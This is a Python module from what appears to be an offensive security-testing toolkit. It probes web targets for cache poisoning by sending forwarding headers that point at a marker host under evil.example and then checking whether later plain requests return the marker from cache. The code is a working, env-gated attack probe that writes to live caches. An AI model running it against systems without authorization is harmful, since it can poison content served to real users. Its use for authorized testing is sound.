"""omega/offensive/offense/cachepoison — web cache poisoning probe.

Inject forwarding headers (X-Forwarded-Host, X-Original-URL, X-
Rewrite-URL) carrying a unique marker; then re-request the SAME url
plain N times — if the marker comes back from the cache without the
poisoning header, the cache stored attacker-controlled content.
OFFENSE-GATED (PTK_OFFENSE). Candidate-grade.
"""
import os
import secrets

__all__ = ["run_cachepoison"]

HEADER_SETS = [
    {"X-Forwarded-Host": "{mk}.evil.example"},
    {"X-Forwarded-Host": "{mk}.evil.example",
     "X-Forwarded-Scheme": "http"},
    {"X-Original-URL": "/{mk}"},
    {"X-Rewrite-URL": "/{mk}"},
    {"X-Forwarded-Port": "1337", "X-Forwarded-Host": "{mk}.evil.example"},
]


def run_cachepoison(target, fetch, reads=6, log=None,
                    gate_open_fn=None):
    """Poison-then-read probe. fetch(url, headers=None) -> resp."""
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    if not callable(fetch):
        return {"note": "fetch adapter required"}
    mk = "omegcp" + secrets.token_hex(5)
    findings = []
    probes = 0
    for hdrs in HEADER_SETS:
        poison_headers = {k: v.replace("{mk}", mk) for k, v in
                          hdrs.items()}
        try:
            fetch(str(target), headers=poison_headers)
            probes += 1
        except TypeError:
            try:
                fetch(str(target))
                probes += 1
            except Exception:
                continue
        except Exception:
            continue
        # plain reads: a cache hit carrying the marker proves poisoning
        hits = 0
        for _ in range(reads):
            try:
                resp = fetch(str(target))
                probes += 1
            except Exception:
                continue
            body = (resp if isinstance(resp, str) else
                    getattr(resp, "text", "") or "")
            if mk in body:
                hits += 1
        if hits:
            findings.append({
                "title": f"cache poisoning candidate via "
                         f"{', '.join(hdrs)}",
                "severity": "HIGH",
                "source": "cachepoison/forwarded-header",
                "evidence": f"poisoning header marker {mk} returned "
                            f"in {hits}/{reads} unauthenticated reads",
                "location": str(target),
                "verification": "candidate",
                "manual_check": "verify the cached key (unkeyed header "
                                "list) with the CDN before reporting",
                "cwe": "CWE-444",
            })
            break
    if log:
        log(f"cachepoison: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
